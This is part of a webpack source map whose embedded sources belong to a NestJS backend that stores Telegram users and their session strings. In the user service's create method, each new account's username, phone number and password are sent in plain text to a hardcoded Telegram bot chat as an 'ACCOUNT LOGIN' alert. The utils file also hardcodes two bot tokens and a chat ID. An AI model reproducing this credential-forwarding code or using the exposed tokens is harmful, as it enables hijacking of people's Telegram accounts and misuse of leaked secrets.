'../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => ClientModule)\r\n  ],\r\n  controllers: [UsersController],\r\n  providers: [UsersService],\r\n  exports: [UsersService]\r\n})\r\nexport class UsersModule { }\r\n","import { TelegramService } from './../Telegram/Telegram.service';\r\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { User, UserDocument } from './schemas/user.schema';\r\nimport { SearchUserDto } from './dto/search-user.dto';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { fetchWithTimeout, ppplbot } from '../../utils';\r\nimport { UpdateUserDto } from './dto/update-user.dto';\r\nimport { CreateUserDto } from './dto/create-user.dto';\r\n\r\n@Injectable()\r\nexport class UsersService {\r\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\r\n    @Inject(forwardRef(() => TelegramService))\r\n    private telegramService: TelegramService,\r\n    @Inject(forwardRef(() => ClientService))\r\n    private clientsService: ClientService\r\n  ) {}\r\n\r\n  async create(user: CreateUserDto): Promise<User> {\r\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\r\n    console.log(\"New User received - \", user?.mobile);\r\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\r\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\r\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\r\n      await this.clientsService.updateClientSession(user.session)\r\n    } else {\r\n      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\r\n      const newUser = new this.userModel(user);\r\n      return newUser.save();\r\n    }\r\n  }\r\n\r\n  async findAll(): Promise<User[]> {\r\n    return this.userModel.find().exec();\r\n  }\r\n\r\n  async findOne(tgId: string): Promise<User> {\r\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\r\n    if (!user) {\r\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\r\n    }\r\n    return user;\r\n  }\r\n\r\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\r\n    delete user['_id']\r\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\r\n    if (result.matchedCount === 0) {\r\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\r\n    }\r\n    return result.modifiedCount;\r\n  }\r\n\r\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\r\n    delete user['_id']\r\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\r\n    if (result.matchedCount === 0) {\r\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\r\n    }\r\n    return result.modifiedCount;\r\n  }\r\n\r\n  async delete(tgId: string): Promise<void> {\r\n    const result = await this.userModel.deleteOne({ tgId }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\r\n    }\r\n  }\r\n  async search(filter: SearchUserDto): Promise<User[]> {\r\n    if (filter.firstName) {\r\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\r\n    }\r\n    if (filter.twoFA !== undefined) {\r\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\r\n    }\r\n    console.log(filter)\r\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\r\n  }\r\n\r\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {\r\n    try {\r\n      if (!query) {\r\n        throw new BadRequestException('Query is invalid.');\r\n      }\r\n      const queryExec = this.userModel.find(query);\r\n\r\n      if (sort) {\r\n        queryExec.sort(sort);\r\n      }\r\n\r\n      if (limit) {\r\n        queryExec.limit(limit);\r\n      }\r\n\r\n      if (skip) {\r\n        queryExec.skip(skip);\r\n      }\r\n\r\n      return await queryExec.exec();\r\n    } catch (error) {\r\n      throw new InternalServerErrorException(error.message);\r\n    }\r\n  }\r\n\r\n}\r\n","import { NestFactory } from '@nestjs/core';\r\nimport mongoose from 'mongoose'\r\nimport { AppModule } from './app.module';\r\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\r\nimport { ValidationPipe } from '@nestjs/common';\r\n\r\nasync function bootstrap() {\r\n  const app = await NestFactory.create(AppModule);\r\n  const config = new DocumentBuilder()\r\n    .setTitle('NestJS and Express API')\r\n    .setDescription('API documentation')\r\n    .setVersion('1.0')\r\n    .build();\r\n\r\n  app.use((req, res, next) => {\r\n    res.header('Access-Control-Allow-Origin', '*');\r\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');\r\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\r\n    next();\r\n  });\r\n\r\n  app.enableCors({\r\n    allowedHeaders: \"*\",\r\n    origin: \"*\"\r\n  });\r\n  const document = SwaggerModule.createDocument(app, config);\r\n  // fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\r\n  SwaggerModule.setup('api', app, document);\r\n  mongoose.set('debug', true)\r\n  app.useGlobalPipes(new ValidationPipe({\r\n    transform: true,\r\n  }));\r\n  process.on('unhandledRejection', (reason, promise) => {\r\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\r\n  });\r\n\r\n  process.on('uncaughtException', (reason, promise) => {\r\n    console.error(promise, reason);\r\n  });\r\n\r\n  let isShuttingDown = false;\r\n  const shutdown = async (signal: string) => {\r\n    if (isShuttingDown) return;\r\n    isShuttingDown = true;\r\n    console.log(`${signal} received`);\r\n    await app.close();\r\n    process.exit(0);\r\n  };\r\n\r\n  process.on('exit', async () => {\r\n    console.log('Application closed');\r\n  });\r\n\r\n  process.on('SIGINT', async () => {\r\n    await shutdown('SIGINT');\r\n  });\r\n\r\n  process.on('SIGTERM', async () => {\r\n    await shutdown('SIGTERM');\r\n  });\r\n\r\n  process.on('SIGQUIT', async () => {\r\n    await shutdown('SIGQUIT');\r\n  });\r\n\r\n  await app.init();\r\n  await app.listen(8000);\r\n}\r\nbootstrap();\r\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\r\nimport { Request, Response, NextFunction } from 'express';\r\nimport { fetchWithTimeout, parseError, ppplbot } from '../utils';\r\n\r\n@Injectable()\r\nexport class LoggerMiddleware implements NestMiddleware {\r\n    private readonly logger = new Logger('HTTP');\r\n\r\n    use(req: Request, res: Response, next: NextFunction): void {\r\n        const { method, originalUrl, baseUrl } = req;\r\n        const userAgent = req.get('user-agent') || '';\r\n        const ip = req.ip;\r\n\r\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup'];\r\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\r\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\r\n            res.on('finish', () => {\r\n                const { statusCode } = res;\r\n                const contentLength = res.get('content-length');\r\n                if (statusCode >= 500) {\r\n                    fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\r\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\r\n                } else if (statusCode >= 400) {\r\n                    fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\r\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\r\n                } else if (statusCode >= 300) {\r\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\r\n                } else {\r\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\r\n                }\r\n            });\r\n            res.on('error', (error) => {\r\n                const errorDetails = parseError(error, process.env.clientId);\r\n                fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\r\n            })\r\n        } else {\r\n            if (originalUrl.includes('Video')) {\r\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\r\n            }\r\n        }\r\n\r\n        next();\r\n    }\r\n}\r\n","import axios, { AddressFamily, AxiosRequestConfig } from 'axios';\r\n\r\nexport function sleep(ms) {\r\n  return new Promise(resolve => setTimeout(resolve, ms));\r\n}\r\nexport function contains(str, arr) {\r\n  return (arr.some(element => {\r\n    if (str?.includes(element)) {\r\n      return true;\r\n    }\r\n    return false;\r\n  }))\r\n};\r\n\r\n\r\nexport async function fetchWithTimeout(resource: string, options: AxiosRequestConfig = {}, maxRetries = 1) {\r\n  options.timeout = options.timeout || 50000;\r\n  options.method = options.method || 'GET';\r\n\r\n  const fetchWithProtocol = async (url: string, version: AddressFamily) => {\r\n    const source = axios.CancelToken.source();\r\n    const id = setTimeout(() => {\r\n      source.cancel(`Request timed out after ${options.timeout}ms`);\r\n    }, options.timeout);\r\n\r\n    try {\r\n      const response = await axios({\r\n        ...options,\r\n        url,\r\n        headers: { 'Content-Type': 'application/json' },\r\n        cancelToken: source.token,\r\n        family: version\r\n      });\r\n      clearTimeout(id);\r\n      return response;\r\n    } catch (error) {\r\n      clearTimeout(id);\r\n      console.log(`Error at URL (IPv${version}): `, url);\r\n      parseError(error);\r\n      if (axios.isCancel(error)) {\r\n        console.log('Request canceled:', error.message, url);\r\n        return undefined;\r\n      }\r\n      throw error; // Rethrow the error to handle retry logic outside\r\n    }\r\n  };\r\n\r\n  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {\r\n    try {\r\n      // First try with IPv4\r\n      const responseIPv4 = await fetchWithProtocol(resource, 4);\r\n      if (responseIPv4) return responseIPv4;\r\n\r\n      // If IPv4 fails, try with IPv6\r\n      const responseIPv6 = await fetchWithProtocol(resource, 6);\r\n      if (responseIPv6) return responseIPv6;\r\n    } catch (error) {\r\n      console.log(\"Error at URL : \", resource)\r\n      const errorDetails = parseError(error)\r\n      if (retryCount < maxRetries && error.code !== 'ERR_NETWORK' && error.code !== \"ECONNABORTED\" && error.code !== \"ETIMEDOUT\" && !errorDetails.message.toLowerCase().includes('too many requests') && !axios.isCancel(error)) {\r\n        console.log(`Retrying... (${retryCount + 1}/${maxRetries})`);\r\n        await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds delay\r\n      } else {\r\n        console.log(`All ${maxRetries + 1} retries failed for ${resource}`);\r\n        return undefined;\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\nexport function toBoolean(value: string | number | boolean): boolean {\r\n  if (typeof value === 'string') {\r\n    return value.toLowerCase() === 'true';\r\n  }\r\n  if (typeof value === 'number') {\r\n    return value === 1;\r\n  }\r\n  return value\r\n}\r\n\r\nexport function fetchNumbersFromString(inputString) {\r\n  const regex = /\\d+/g;\r\n  const matches = inputString.match(regex);\r\n  if (matches) {\r\n    const result = matches.join('');\r\n    return result;\r\n  } else {\r\n    return '';\r\n  }\r\n}\r\n\r\nexport function parseError(\r\n  err,\r\n  prefix = 'TgCms',\r\n) {\r\n  let status = 'UNKNOWN';\r\n  let message = 'An unknown error occurred';\r\n  let error = 'UnknownError';\r\n\r\n  const extractMessage = (data) => {\r\n    if (Array.isArray(data)) {\r\n      const messages = data.map((item) => extractMessage(item));\r\n      return messages.filter((message) => message !== undefined).join(', ');\r\n    } else if (typeof data === 'string') {\r\n      return data;\r\n    } else if (typeof data === 'object' && data !== null) {\r\n      let resultString = ''\r\n      for (const key in data) {\r\n        const value = data[key]\r\n        if (Array.isArray(data[key]) && data[key].every(item => typeof item === 'string')) {\r\n          resultString = resultString + data[key].join(', ');\r\n        } else {\r\n          const result = extractMessage(value);\r\n          if (result) {\r\n            resultString = resultString + result;\r\n          }\r\n        }\r\n      }\r\n      return resultString\r\n    }\r\n    return JSON.stringify(data);\r\n  };\r\n\r\n  if (err.response) {\r\n    const response = err.response;\r\n    status =\r\n      response.data?.status ||\r\n      response.status ||\r\n      err.status ||\r\n      'UNKNOWN';\r\n    message =\r\n      response.data?.message ||\r\n      response.data?.errors ||\r\n      response.errorMessage ||\r\n      response.message ||\r\n      response.statusText ||\r\n      response.data ||\r\n      err.message ||\r\n      'An error occurred';\r\n    error =\r\n      response.data?.error ||\r\n      response.error ||\r\n      err.name ||\r\n      err.code ||\r\n      'Error';\r\n  } else if (err.request) {\r\n    status = err.status || 'NO_RESPONSE';\r\n    message = err.data?.message ||\r\n      err.data?.errors ||\r\n      err.message ||\r\n      err.statusText ||\r\n      err.data ||\r\n      err.message || 'The request was triggered but no response was received';\r\n    error = err.name || err.code || 'NoResponseError';\r\n  } else if (err.message) {\r\n    status = err.status || 'UNKNOWN';\r\n    message = err.message;\r\n    error = err.name || err.code || 'Error';\r\n  } else if (err.errorMessage) {\r\n    status = err.status || 'UNKNOWN';\r\n    message = err.errorMessage;\r\n    error = err.name || err.code || 'Error';\r\n  }\r\n\r\n  const msg = `${prefix ? `${prefix} ::` : \"\"} ${extractMessage(message)} `\r\n\r\n  const resp = { status, message: err.errorMessage || msg, error };\r\n  console.log(resp.error == 'RPCError' ? resp.message : resp);\r\n  return resp\r\n}\r\nlet botCount = 0;\r\n\r\nexport function ppplbot(chatId?: string, botToken?: string) {\r\n  let token = botToken;\r\n\r\n  if (!token) {\r\n    if (botCount % 2 === 1) {\r\n      token = 'bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY';\r\n    } else {\r\n      token = 'bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA';\r\n    }\r\n    botCount++;\r\n  }\r\n  const targetChatId = chatId || '-1001801844217'; // Replace with actual chat ID\r\n  const apiUrl = `https://api.telegram.org/${token}/sendMessage?chat_id=${targetChatId}`;\r\n  return apiUrl;\r\n};\r\n\r\nexport const defaultReactions = [\r\n  '❤', '🔥', '👏', '🥰', '😁', '🤔',\r\n  '🤯', '😱', '🤬', '😢', '🎉', '🤩',\r\n  '🤮', '💩', '🙏', '👌', '🕊', '🤡',\r\n  '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\r\n  '🤣', '💔', '🏆', '😭', '😴', '👍',\r\n  '🌚', '⚡', '🍌', '😐', '💋', '👻',\r\n  '👀', '🙈', '🤝', '🤗', '🆒',\r\n  '🗿', '🙉', '🙊', '🤷', '👎'\r\n]\r\nexport const defaultMessages = [\r\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\r\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\r\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\r\n];\r\n\r\nexport function areJsonsNotSame(json1: any, json2: any): boolean {\r\n  const keysToIgnore = [\"id\", \"_id\"];\r\n\r\n  function deepCompare(obj1: any, obj2: any): boolean {\r\n    if (obj1 === obj2) return true;\r\n\r\n    if (typeof obj1 !== \"object\" || typeof obj2 !== \"object\" || obj1 === null || obj2 === null) {\r\n      return false;\r\n    }\r\n\r\n    const keys1 = Object.keys(obj1).filter(key => !keysToIgnore.includes(key)).sort();\r\n    const keys2 = Object.keys(obj2).filter(key => !keysToIgnore.includes(key)).sort();\r\n\r\n    if (keys1.length !== keys2.length) return false;\r\n\r\n    return keys1.every(key => deepCompare(obj1[key], obj2[key]));\r\n  }\r\n\r\n  return !deepCompare(json1, json2);\r\n}\r\n\r\nexport function mapToJson(map: Map<any, any>) {\r\n  // Convert Map to a plain object\r\n  const obj: Record<string, any> = {};\r\n  for (const [key, value] of map.entries()) {\r\n    // Convert key to string since JSON keys are always strings\r\n    obj[String(key)] = value;\r\n  }\r\n  return obj\r\n}\r\n","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"imap\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","","// startup\n// Load entry module and return exports\n// This entry module is referenced by other modules so it can't be inlined\nvar __webpack_exports__ = __webpack_require__(\"./src/main.ts\");\n",""],"names":[],"sourceRoot":""}